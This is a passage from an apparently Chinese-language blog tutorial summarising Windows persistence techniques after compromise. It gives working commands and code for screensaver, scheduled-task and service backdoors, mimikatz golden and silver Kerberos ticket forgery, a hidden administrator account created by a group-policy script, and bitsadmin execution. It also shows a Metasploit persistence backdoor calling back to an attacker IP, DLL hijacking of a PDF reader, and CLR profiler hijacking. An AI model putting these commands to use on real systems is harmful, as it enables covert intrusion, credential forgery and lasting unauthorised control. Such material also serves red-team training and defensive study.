+<p>注册表位置：HKEY_CURRENT_USER\Control Panel\Desktop</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SCRNSAVE.EXE为默认的屏保程序，我们可将此键值设置为我们要利用的恶意程序。在本质上，.scr文件是可执行文件。ScreenSaveActive表示屏保状态，<span class="number">1</span>为启动，<span class="number">0</span>为关闭。ScreenSaverTimeout表示屏幕保护程序启动前系统的空闲事件，单位为秒，默认为<span class="number">900</span>(<span class="number">15</span>分钟)。ScreenSaverIsSecure默认参数为<span class="number">0</span>，标识不需要密码即可解锁。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223133.webp" alt="图片"></p>
+<p>修改SCRASAVE.EXE的值为后门程序路径，等待屏保时间自动运行。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot;</span> /v SCRNSAVE.EXE /t REG_SZ /d <span class="string">&quot;c:\666.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223134.webp" alt="图片"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223135.webp" alt="图片"></p>
+<h4 id="七、计划任务后门"><a href="#七、计划任务后门" class="headerlink" title="七、计划任务后门"></a><strong>七、计划任务后门</strong></h4><p>schtasks命令设定计划自动启动后门程序。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /tn Updater /tr c:\<span class="number">666</span>.exe /<span class="built_in">sc</span> minute /mo <span class="number">5</span>  </span><br><span class="line"><span class="comment">#每5分钟自动执行666.exe</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027223136.webp" alt="图片"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224137.webp" alt="图片"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224138.webp" alt="图片"></p>
+<h4 id="八、服务自启动后门"><a href="#八、服务自启动后门" class="headerlink" title="八、服务自启动后门"></a><strong>八、服务自启动后门</strong></h4><p>自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将exe文件注册为服务，也可以将dll文件注册为服务。</p>
+<p><strong>演示：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sc</span> create test binpath= c:\<span class="number">666</span>.exe    （注意等号后面有空格）</span><br><span class="line"><span class="comment">#创建服务sc config test start= auto</span></span><br><span class="line"><span class="comment">#设置服务为自动启动net start test                #启动服务</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224139.webp" alt="图片"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224140.webp" alt="图片"></p>
+<h4 id="九、黄金票据"><a href="#九、黄金票据" class="headerlink" title="九、黄金票据"></a><strong>九、黄金票据</strong></h4><p>在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个 Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的,所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。</p>
+<p><strong>演示：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用条件：1.域sid2.域名称3.krbtgt ntlm <span class="built_in">hash</span>或aes256值</span><br></pre></td></tr></table></figure>
+
+<p>未注入票据访问域控被拒绝。</p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224141.webp" alt="图片"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看krbtgt ntlm hash：lsadump::dcsync <span class="regexp">/domain:&lt;域名&gt; /u</span>ser:krbtgt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224142.webp" alt="图片"></p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">清空票据信息：kerberos::purge</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224143.webp" alt="图片"></p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">生成票据：kerberos::golden /admin:<span class="params">&lt;用户名&gt;</span> /domain:<span class="params">&lt;域名&gt;</span> /sid:<span class="params">&lt;域SID&gt;</span> /krbtgt:<span class="params">&lt;ntlm hash&gt;</span> /ticket:<span class="params">&lt;票据名&gt;</span></span><br><span class="line">导入票据：kerberos::ptt Administrator.kiribi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224144.webp" alt="图片"></p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">导入票据：kerberos::ptt <span class="module-access"><span class="module"><span class="identifier">Administrator</span>.</span></span>kiribi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224145.webp" alt="图片"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224146.webp" alt="图片"></p>
+<p>票据注入成功。</p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027224147.webp" alt="图片"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225148.webp" alt="图片"></p>
+<p><strong>十、白银票据</strong></p>
+<p>黄金票据伪造的TGT,那么白银票据伪造的是ST。在Kerberos认证的第三步，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST,从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了。所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,伪造的门票只对部分服务起作用。</p>
+<p>白银票据常用服务：</p>
+<table>
+<thead>
+<tr>
+<th><strong>Service Type</strong></th>
+<th><strong>Service Silver Tickets</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WMI</td>
+<td>HOST RPCSS</td>
+</tr>
+<tr>
+<td>PowerShell Remoting</td>
+<td>HOST HTTP</td>
+</tr>
+<tr>
+<td>WinRM</td>
+<td>HOST HTTP</td>
+</tr>
+<tr>
+<td>Scheduled Tasks</td>
+<td>HOST</td>
+</tr>
+<tr>
+<td>Windows File Share (CIFS)</td>
+<td>CIFS</td>
+</tr>
+<tr>
+<td>LDAP operations includingMimikatz DCSync</td>
+<td>LDAP</td>
+</tr>
+<tr>
+<td>Windows Remote Server Administration Tools</td>
+<td>RPCSS LDAP CIFS</td>
+</tr>
+</tbody></table>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用条件：1.目标服务器全域名2.域sid3.可利用的服务4.服务账号的ntlm <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>演示-伪造CIFS权限：</strong></p>
+<p>CIFS用于主机之间文件共享。</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">生成票据：kerberos::golden /domain:<span class="params">&lt;域名&gt;</span> /sid:<span class="params">&lt;域 SID&gt;</span> /target:<span class="params">&lt;目标服务器主机名&gt;</span> /service:<span class="params">&lt;服务类型&gt;</span> /rc4:<span class="params">&lt;NTLM Hash&gt;</span> /user:<span class="params">&lt;用户名&gt;</span> /ptt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225149.webp" alt="图片"></p>
+<p>此时就可以访问目标机器的共享目录了。</p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225150.webp" alt="图片"></p>
+<h4 id="十一、组策略设置脚本启动"><a href="#十一、组策略设置脚本启动" class="headerlink" title="十一、组策略设置脚本启动"></a><strong>十一、组策略设置脚本启动</strong></h4><p>1.首先创建一个脚本，此处为添加隐藏用户，内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> offnet user <span class="built_in">test</span>$ Test123456. /addnet localgroup administrators <span class="built_in">test</span>$ /addexit</span><br></pre></td></tr></table></figure>
+
+<p>2.打开组策略配置脚本（启动/关机），添加脚本，关机就会自动执行脚本。</p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225151.webp" alt="图片"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225152.webp" alt="图片"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225153.webp" alt="图片"></p>
+<h4 id="十二、bitsadmin"><a href="#十二、bitsadmin" class="headerlink" title="十二、bitsadmin"></a><strong>十二、bitsadmin</strong></h4><p>BITS (后台智能传送服务) 是一个 Windows 组件，它可以在前台或后台异步传输文件，为保证其他网络应用程序获得响应而调整传输速度，并在重新启动计算机或重新建立网络连接之后自动恢复文件传输。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">常用命令：bitsadmin <span class="regexp">/create [type] DisplayName /</span><span class="regexp">/创建一个任务bitsadmin /</span>cancel &lt;Job&gt; <span class="regexp">//</span>删除一个任务bitsadmin <span class="regexp">/list /</span>allusers <span class="regexp">/verbose /</span><span class="regexp">/列出所有任务bitsadmin /</span>AddFile &lt;Job&gt; &lt;RemoteURL&gt; &lt;LocalName&gt; <span class="regexp">//</span>给任务test添加一个下载文件bitsadmin <span class="regexp">/SetNotifyCmdLine &lt;Job&gt; &lt;ProgramName&gt; [ProgramParameters] /</span><span class="regexp">/设置在任务完成传输时或任务进入状态时将运行的命令行命令。bitsadmin /</span>Resume &lt;Job&gt; <span class="regexp">//</span>激活传输队列中的新任务或挂起的任务。bitsadmin <span class="regexp">/cancel &lt;Job&gt; /</span><span class="regexp">/删除某个任务bitsadmin /</span>reset <span class="regexp">/allusers /</span><span class="regexp">/删除所有任务bitsadmin /</span>complete &lt;Job&gt; <span class="regexp">//</span>完成某个任务</span><br></pre></td></tr></table></figure>
+
+<p><strong>演示：</strong></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /create test   //创建任务testbitsadmin /addfile test c:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\c</span>alc.exe c:<span class="symbol">\U</span>sers<span class="symbol">\n</span>dsec<span class="symbol">\D</span>esktop<span class="symbol">\c</span>alc.exebitsadmin /SetNotifyCmdLine test cmd.exe &quot;cmd.exe /c calc.exe&quot;bitsadmin /resume test</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225154.webp" alt="图片"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225155.png" alt="图片"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225156.webp" alt="图片"></p>
+<h4 id="十三、msf-persistence后门"><a href="#十三、msf-persistence后门" class="headerlink" title="十三、msf persistence后门"></a><strong>十三、msf persistence后门</strong></h4><p>使用persistence模块创建后门。</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参数：-A 自动启动匹配的exploit<span class="meta-keyword">/multi/</span>handler 连接到代理-L <span class="params">&lt;opt&gt;</span> 目标主机中要写入有效负载的位置，如果没有，将使用 %TEMP%。-P <span class="params">&lt;opt&gt;</span> 要使用的有效负载，默认为 windows<span class="meta-keyword">/meterpreter/</span>reverse_tcp。-S 在启动时自动启动代理作为服务（具有 SYSTEM 权限）-T <span class="params">&lt;opt&gt;</span> 要使用的备用可执行模板-U 用户登录时自动启动代理-X 系统启动时自动启动代理-h 帮助菜单-i <span class="params">&lt;opt&gt;</span> 每次连接尝试之间的时间间隔（以秒为单位）-p <span class="params">&lt;opt&gt;</span> 运行 Metasploit 的系统正在监听的端口-r <span class="params">&lt;opt&gt;</span> 运行 Metasploit 的系统的 IP 监听连接</span><br></pre></td></tr></table></figure>
+
+<p>执行如下命令，在目标机创建一个vbs后门，每5秒进行回连：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">run</span> persistence -S -U -X -i <span class="number">5</span> -p <span class="number">55555</span> -r <span class="number">192.168.1.128</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225157.webp" alt="图片"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225158.webp" alt="图片"></p>
+<p>监听55555端口，成功上线。</p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225159.webp" alt="图片"></p>
+<h4 id="十四、DLL劫持"><a href="#十四、DLL劫持" class="headerlink" title="十四、DLL劫持"></a><strong>十四、DLL劫持</strong></h4><p>DLL(Dynamic Link Library)文件为动态链接库文件，又称”应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。</p>
+<p><strong>dll加载顺序:</strong></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows xp sp2之前：1. 进程对应的应用程序所在目录；2. 当前目录（Current Directory）；3. 系统目录（通过 GetSystemDirectory 获取）；4. 16位系统目录；5. Windows目录（通过 GetWindowsDirectory 获取）；6. PATH环境变量中的各个目录；</span><br><span class="line">Windows xp sp2之后：Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode 默认会被开启）：默认注册表为：HKEY_LOCAL_MACHINE<span class="symbol">\S</span>ystem<span class="symbol">\C</span>urrentControlSet<span class="symbol">\C</span>ontrol<span class="symbol">\S</span>ession Manager<span class="symbol">\S</span>afeDllSearchMode，其键值为11. 进程对应的应用程序所在目录（可理解为程序安装目录比如C:<span class="symbol">\P</span>rogramFiles<span class="symbol">\u</span>Torrent）2. 系统目录（即<span class="variable">%windir%</span>system32）；3. 16位系统目录（即<span class="variable">%windir%</span>system）；4. Windows目录（即<span class="variable">%windir%</span>）；5. 当前目录（运行的某个文件所在目录，比如C:<span class="symbol">\D</span>ocuments and Settings<span class="symbol">\A</span>dministrator<span class="symbol">\D</span>esktop<span class="symbol">\t</span>est）；6. PATH环境变量中的各个目录；</span><br><span class="line">win7以上版本：系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从exe自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置：HKEY_LOCAL_MACHINE<span class="symbol">\S</span>YSTEM<span class="symbol">\C</span>urrentControlSet<span class="symbol">\C</span>ontrol<span class="symbol">\S</span>ession Manager<span class="symbol">\K</span>nownDLLs</span><br></pre></td></tr></table></figure>
+
+<p><strong>演示-劫持极速pdf阅读器：</strong></p>
+<p>1.使用process explorer分析可以劫持的dll文件，劫持sqlite3.dll</p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225160.webp" alt="图片"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225161.webp" alt="图片"></p>
+<p>2.使用ahaeadlib将sqlite3.dll转为cpp文件</p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225162.webp" alt="图片"></p>
+<p>3.使用visual studio打开cpp文件插入要执行的后门代码，并生成新的dll文件</p>
+<figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">STARTUPINFO si = &#123; sizeof(si) &#125;;PROCESS_INFORMATION <span class="built_in">pi</span>;CreateProcess(TEXT(<span class="string">&quot;C:\\666.exe&quot;</span>), <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">false</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;<span class="built_in">pi</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027225163.webp" alt="图片"></p>
+<p>4.将新的dll文件改名为sqlite3.dll，将旧的sqlite3.dll改为sqlite3Org.dll</p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027226164.webp" alt="图片"></p>
+<p>5.打开极速pdf阅读器后成功上线</p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027226165.webp" alt="图片"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027226166.webp" alt="图片"></p>
+<h4 id="十五、CLR劫持"><a href="#十五、CLR劫持" class="headerlink" title="十五、CLR劫持"></a><strong>十五、CLR劫持</strong></h4><p>CLR全称Common Language Runtime，中文名称为公共语言运行时。CLR是.NETFramework的主要执行引擎，作用之一是监视程序的运行。可以理解成，让系统在执行.NET程序的时候先执行一个你指定的dll文件。</p>
+<p>1.修改注册表：HKEY_CURRENT_USER\Software\Classes\CLSID\</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1234-1234-1234-111111111111&#125;\InProcServer32&quot;</span> <span class="string">/VE</span> <span class="string">/T</span> REG_SZ <span class="string">/D</span> <span class="string">&quot;C:\test.dll&quot;</span> <span class="string">/FREG</span> ADD <span class="string">&quot;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1234-1234-1234-111111111111&#125;\InProcServer32&quot;</span> <span class="string">/V</span> ThreadingModel <span class="string">/T</span> REG_SZ <span class="string">/D</span> Apartment <span class="string">/F</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027226167.webp" alt="图片"></p>
+<p>2.配置全局环境变量，不然只在当前cmd窗口劫持.net程序，然后直接执行powershell即可上线。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">SETX</span> COR_ENABLE_PROFILING <span class="number">1</span> /MSETX COR_PROFILER &#123;<span class="number">11111111</span>-<span class="number">1234</span>-<span class="number">1234</span>-<span class="number">1234</span>-<span class="number">111111111111</span>&#125; /M</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027226168.webp" alt="图片"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/640-1641980027226169.webp" alt="图片"></p>
+
+      
+    </div>
+    
+    
+    
+	
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Ax-x
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/" title="Windows权限维持总结">https://ax-x.github.io/2023/04/19/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"><i class="fa fa-tag"></i> 学习笔记</a>
+          
+            <a href="/tags/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="tag"><i class="fa fa-tag"></i> Windows权限维持</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2023/04/17/%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/" rel="next" title="钓鱼平台搭建">
+                <i class="fa fa-chevron-left"></i> 钓鱼平台搭建
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+		
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+		
+      
+		
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/head_portrait.png"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+		
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Ax-x" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%BD%B1%E5%AD%90%E8%B4%A6%E6%88%B7"><span class="nav-number">1.</span> <span class="nav-text">一、影子账户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8"><span class="nav-number">2.</span> <span class="nav-text">二、粘滞键后门</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%89%E3%80%81logon-scripts%E5%90%8E%E9%97%A8"><span class="nav-number">3.</span> <span class="nav-text">三、logon scripts后门</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81"><span class="nav-number">4.</span> <span class="nav-text">四、映像劫持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%90%8E%E9%97%A8"><span class="nav-number">5.</span> <span class="nav-text">五、注册表自启动后门</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E5%B1%8F%E5%B9%95%E4%BF%9D%E6%8A%A4%E7%A8%8B%E5%BA%8F%E5%90%8E%E9%97%A8"><span class="nav-number">6.</span> <span class="nav-text">六、屏幕保护程序后门</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="nav-number">7.</span> <span class="nav-text">七、计划任务后门</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E6%9C%8D%E5%8A%A1%E8%87%AA%E5%90%AF%E5%8A%A8%E5%90%8E%E9%97%A8"><span class="nav-number">8.</span> <span class="nav-text">八、服务自启动后门</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-number">9.</span> <span class="nav-text">九、黄金票据</span></a></li><li class="nav-item nav-level-4"><a 